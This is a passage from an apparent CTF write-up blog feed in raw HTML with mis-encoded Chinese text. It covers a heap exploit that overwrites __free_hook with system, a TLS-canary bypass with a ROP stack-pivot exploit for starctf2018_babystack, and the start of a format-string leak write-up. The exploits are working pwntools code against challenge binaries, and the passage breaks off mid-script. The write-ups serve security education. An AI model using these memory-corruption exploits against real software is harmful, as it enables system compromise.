inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31701)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size,content):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0xf8,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">add(7,0xf8,&quot;aaaa&quot;)#7</span><br><span class="line">add(8,0x88,&quot;aaaa&quot;)#8</span><br><span class="line">add(9,0xf8,&quot;aaaa&quot;)#9</span><br><span class="line">add(10,0x88,&quot;aaaa&quot;)#10</span><br><span class="line">for i in range(7):</span><br><span class="line">    free(i)</span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line">add(11,0x88,b&#x27;a&#x27;*0x80+p64(0x90+0x100))</span><br><span class="line"></span><br><span class="line">free(9)</span><br><span class="line">#bug()</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0xf8,&quot;/bin/sh\x00&quot;)</span><br><span class="line">add(7,0xf8,&quot;cccc&quot;)</span><br><span class="line">show(11)</span><br><span class="line">libc_base=get_addr64()-4111520</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">add(8,0x88,b&#x27;a&#x27;)</span><br><span class="line">add(9,0xf8,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line">add(12,0x88,b&#x27;a&#x27;*0x80+p64(0x90+0x100))</span><br><span class="line">free(9)</span><br><span class="line"></span><br><span class="line">add(13,0x88,b&#x27;a&#x27;)</span><br><span class="line">free(13)</span><br><span class="line">free(11)</span><br><span class="line">add(14,0xb8,b&#x27;\x00&#x27;*0x60+p64(0x100)+p64(0x90)+p64(free_hook))</span><br><span class="line">add(0,0x88,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">add(1,0x88,p64(system))</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">2025HGAME</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>TLSåŠ«æŒè¿‡canary</title>
    <link href="https://www.thir0th.xyz/posts/d7e62ac2.html"/>
    <id>https://www.thir0th.xyz/posts/d7e62ac2.html</id>
    <published>2025-04-19T09:13:35.000Z</published>
    <updated>2025-05-07T08:10:35.676Z</updated>
    
    <content type="html"><![CDATA[<h1>pth_create</h1><p>CTFwiki:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å·²çŸ¥ Canary å‚¨å­˜åœ¨ TLS ä¸­ï¼Œåœ¨å‡½æ•°è¿”å›å‰ä¼šä½¿ç”¨è¿™ä¸ªå€¼è¿›è¡Œå¯¹æ¯”ã€‚å½“æº¢å‡ºå°ºå¯¸è¾ƒå¤§æ—¶ï¼Œå¯ä»¥åŒæ—¶è¦†ç›–æ ˆä¸Šå‚¨å­˜çš„ Canary å’Œ TLS å‚¨å­˜çš„ Canary å®ç°ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure><h2 id="åŸºç¡€çŸ¥è¯†ï¼š">åŸºç¡€çŸ¥è¯†ï¼š</h2><p><a href="https://xz.aliyun.com/t/13074?time__1311=GqmhBKqIxGxBMx%2BoEDcWwP%2B34R2PoD">TLS_bypass_Canary - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/CH13hh/p/18296983">åŠ«æŒTLSç»•è¿‡canary &amp;&amp; å †å’Œæ ˆçš„çµæ´»è½¬æ¢ - CH13hh - åšå®¢å›­ (cnblogs.com)</a></p><p><font style="color:rgb(35, 38, 59);">ä»€ä¹ˆæ˜¯TLScanaryï¼Ÿ</font></p><p><font style="color:rgb(35, 38, 59);">TLScanary æ˜¯ä¸€ç§åœ¨ Pwnï¼ˆä¸»è¦æ˜¯äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ï¼‰ä¸­å¸¸è§çš„æŠ€æœ¯ï¼Œä¸“é—¨ç”¨äºå¤„ç† TLS ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚åœ¨å®‰å…¨ç«èµ›ï¼ˆä¾‹å¦‚ CTFï¼‰å’Œæ¼æ´åˆ©ç”¨åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…éœ€è¦åº”å¯¹ç›®æ ‡ç¨‹åºçš„å¤šå±‚å®‰å…¨æœºåˆ¶ï¼Œå…¶ä¸­ TLS æ˜¯ä¸€ç§å¸¸è§çš„ä¿æŠ¤æªæ–½ã€‚TLScanary ç»“åˆäº† TLS åè®®ä¸å †æ ˆä¿æŠ¤ï¼ˆstack canaryï¼‰æŠ€æœ¯ï¼Œå¢åŠ äº†æ”»å‡»éš¾åº¦ã€‚</font></p><p><font style="color:rgb(35, 38, 59);">å¯è§TLSå’Œcanaryæœ‰ç€ä¸å¯åˆ†å‰²çš„å…³ç³»</font></p><p><font style="color:rgb(35, 38, 59);">TLSçš„åŸºæœ¬æ¦‚å¿µï¼ˆpwn canaryä¸­ï¼‰</font></p><p><font style="color:rgb(35, 38, 59);">TLS æ˜¯ä¸€ç§ç”¨äºåœ¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨æ•°æ®çš„æœºåˆ¶ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ TLS åŒºåŸŸï¼Œç”¨äºå­˜å‚¨ä¸è¯¥çº¿ç¨‹ç›¸å…³çš„ç‰¹å®šæ•°æ®ã€‚</font></p><p><font style="color:rgb(35, 38, 59);">åœ¨å †æ ˆä¿æŠ¤æ–¹é¢ï¼ŒTLS å¸¸è¢«ç”¨äºå­˜å‚¨å †æ ˆ canary å€¼ï¼Œè¿™æ˜¯ä¸€ç§é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»çš„å®‰å…¨æªæ–½ã€‚</font></p><p><font style="color:rgb(35, 38, 59);">å †æ ˆ canary æ˜¯ä¸€ç§åœ¨å‡½æ•°è¿”å›åœ°å€ä¹‹å‰æ’å…¥çš„ç‰¹æ®Šå€¼ï¼Œç”¨äºæ£€æµ‹å †æ ˆæº¢å‡ºã€‚å¦‚æœç¼“å†²åŒºæº¢å‡ºè¦†ç›–äº† canary å€¼ï¼Œç¨‹åºä¼šåœ¨è¿”å›å‰æ£€æµ‹åˆ°ä¸ä¸€è‡´ï¼Œå¹¶ç»ˆæ­¢æ‰§è¡Œï¼Œé˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œã€‚</font></p><p><font style="color:rgb(35, 38, 59);">å…¶å®å¯¹äºå¤šçº¿ç¨‹çš„canaryæ¥è¯´ï¼Œæ¯ä¸ªçº¿ç¨‹çš„canaryéƒ½æ˜¯ç‹¬ç«‹å­˜åœ¨çš„ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è¢«åˆ›å»ºæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºè¯¥çº¿ç¨‹åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„ TLS åŒºåŸŸã€‚è¿™ä¸ªåŒºåŸŸé€šå¸¸é€šè¿‡æŸç§çº¿ç¨‹æ§åˆ¶å—ï¼ˆTCBï¼‰æ¥ç®¡ç†ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ TCBã€‚</font></p><p><font style="color:rgb(35, 38, 59);">åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹çš„å †æ ˆä¸Šéƒ½ä¼šæœ‰ä¸€ä¸ªç‹¬ç«‹çš„ canary å€¼ã€‚æ“ä½œç³»ç»Ÿæˆ–è¿è¡Œæ—¶åº“åœ¨ä¸ºæ¯ä¸ªçº¿ç¨‹åˆ†é…å †æ ˆæ—¶ï¼Œä¼šåœ¨å †æ ˆçš„é€‚å½“ä½ç½®æ’å…¥ä¸€ä¸ª canary å€¼ã€‚</font></p><p><font style="color:rgb(77, 77, 77);">pthread_create è¯´ç™½äº†å°±æ˜¯çº¿ç¨‹idæ”¾ä¸‹äº†æ•°ç»„ï¼Œç„¶ååˆ›å»ºçš„çº¿ç¨‹èµ°starté‚£ä¸ªå‡½æ•°</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;pthread.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> pthread_create(</span><br><span class="line">                 pthread_t *restrict tidp,   //æ–°åˆ›å»ºçš„çº¿ç¨‹IDæŒ‡å‘çš„å†…å­˜å•å…ƒã€‚</span><br><span class="line">                 const pthread_attr_t *restrict attr,  //çº¿ç¨‹å±æ€§ï¼Œé»˜è®¤ä¸ºNULL</span><br><span class="line">                 void *(*start_rtn)(void *), //æ–°åˆ›å»ºçš„çº¿ç¨‹ä»start_rtnå‡½æ•°çš„åœ°å€å¼€å§‹è¿è¡Œ</span><br><span class="line">                 void *restrict arg //é»˜è®¤ä¸ºNULLã€‚è‹¥ä¸Šè¿°å‡½æ•°éœ€è¦å‚æ•°ï¼Œå°†å‚æ•°æ”¾å…¥ç»“æ„ä¸­å¹¶å°†åœ°å€ä½œä¸ºargä¼ å…¥ã€‚</span><br><span class="line">                  );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">pthread_join ä½¿ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹ç»“æŸ</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> pthread_join(pthread_t thread, void **value_ptr);</span><br><span class="line">threadï¼šç­‰å¾…é€€å‡ºçº¿ç¨‹çš„çº¿ç¨‹å·ã€‚</span><br><span class="line">value_ptrï¼šé€€å‡ºçº¿ç¨‹çš„è¿”å›å€¼ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é€‚ç”¨æ¡ä»¶ï¼š">é€‚ç”¨æ¡ä»¶ï¼š</h2><p>pth_createåˆ›é€ çš„å­è¿›ç¨‹ä¸­å¯ä»¥æº¢å‡ºå¤§é‡å­—èŠ‚ï¼Œä¸€èˆ¬ä¸º0x900,è¦è¦†ç›–fs+0x28çš„canary</p><p>ä¸€èˆ¬ç»“åˆæ ˆè¿ç§»æ¥ä½¿ç”¨</p><p>è°ƒè¯• fsbase</p><p><a href="https://grxer.github.io/2023/03/26/TLS-Hijack/">TLSåŠ«æŒè¿‡canary(TLS Hijack Bypass Canary) (grxer.github.io)</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553204255-5891a608-40d4-44c2-8f34-4e8e3c105e61.png" alt=""></p><h2 id="æ¥ä¸ªä¾‹é¢˜">æ¥ä¸ªä¾‹é¢˜</h2><p><font style="color:rgb(33, 37, 41);">starctf2018_babystack</font></p><p><font style="color:rgb(33, 37, 41);">æœ‰ä¸ª0x10000çš„æº¢å‡ºå­—èŠ‚ï¼Œè¦†ç›–åæ‰§è¡Œæ ˆè¿ç§»æ³„éœ²libc_baseï¼ŒæŠŠæ ˆè¿åˆ°bsså¹¶æ„é€ ä¸€æ¬¡readï¼Œæœ€åæ‰“one_gadget</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553119658-84a5b867-3214-4ac8-8539-f3587b4cc188.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553129176-c0e06097-1dd6-412a-8f56-5c8d1fda0424.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.27.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,28835)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss=<span class="number">0x602010</span></span><br><span class="line">leave_ret=<span class="number">0x400A9B</span></span><br><span class="line">rdi=<span class="number">0x0000000000400c03</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000400c01</span></span><br><span class="line">rl(<span class="string">&quot;How many bytes do you want to send?&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x1900</span>))</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1010</span>+p64(bss-<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1900</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">libc_base=get_addr64()-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pr(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ogg=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget=libc_base+ogg[<span class="number">2</span>]</span><br><span class="line">s(p64(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><font style="color:rgb(35, 38, 59);"></font></p><p><font style="color:rgb(35, 38, 59);"></font></p>]]></content>
    
    
    <summary type="html">TLSåŠ«æŒè¿‡canary</summary>
    
    
    
    <category term="Canary" scheme="https://www.thir0th.xyz/categories/Canary/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>fmtä¸­%*dçš„åˆ©ç”¨</title>
    <link href="https://www.thir0th.xyz/posts/1bb30b9a.html"/>
    <id>https://www.thir0th.xyz/posts/1bb30b9a.html</id>
    <published>2025-04-19T09:13:35.000Z</published>
    <updated>2025-05-07T08:11:20.679Z</updated>
    
    <content type="html"><![CDATA[<p>corectfçš„ä¸€é“é¢˜ï¼Œè§è¯†åˆ°äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ–°ç”¨æ³•%*d</p><p>æŒ‡é’ˆæ®‹ç•™ï¼Œç”±ä¸è§„èŒƒä½¿ç”¨å‡½æ•°é€ æˆã€‚</p><p>printf(â€œ%*dâ€,&amp;a,&amp;b) æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨rdiï¼Œaå’Œbæ²¡æœ‰è§„å®šä½†ä¼šå–rsi rdxä¸­çš„å€¼</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/43448046/1722575576346-a39674ea-bb70-4ca5-99a2-6aa5300f2689.jpeg" alt=""></p><p>do_printfå‡½æ•°ä¸­ï¼Œåªå…è®¸è¯»å…¥ä¸‰ä¸ªå­—èŠ‚ï¼Œprintf hereçš„rsiä¼šæ®‹ç•™åˆ°ç¬¬äºŒæ¬¡printf,ç¬¬äºŒä¸ªprintfæ­¤æ—¶rsiæ˜¯ä¸€ä¸ªå æ ˆåœ°å€ï¼Œæ•°å¾ˆå¤§ï¼Œè¾“å‡ºä¼šæŠŠç¼“å†²åŒºå¡«æ»¡ï¼Œç¼“å†²åŒºæœ€åæœ‰libcåœ°å€ï¼Œ%sä¼šç›´æ¥æŠŠlibcåœ°å€æ‰“å°å‡ºæ¥ï¼Œæ‹¿åˆ°libcåç›´æ¥è¾“å…¥system(è°ƒè¯•æœ‰ç‚¹è´¹CPUï¼Œç¬¬ä¸€æ¬¡é‡åˆ°è™šæ‹Ÿæœºå¡æ­»)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575384708-1f6f2c67-9410-44b8-b21e-06fa02b13c79.png" alt=""><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575721265-4b11ded9-d96d-49e5-97e1-aa9e6d8c1376.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575944381-ce16043b-4f70-4303-a974-de388757ee45.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span 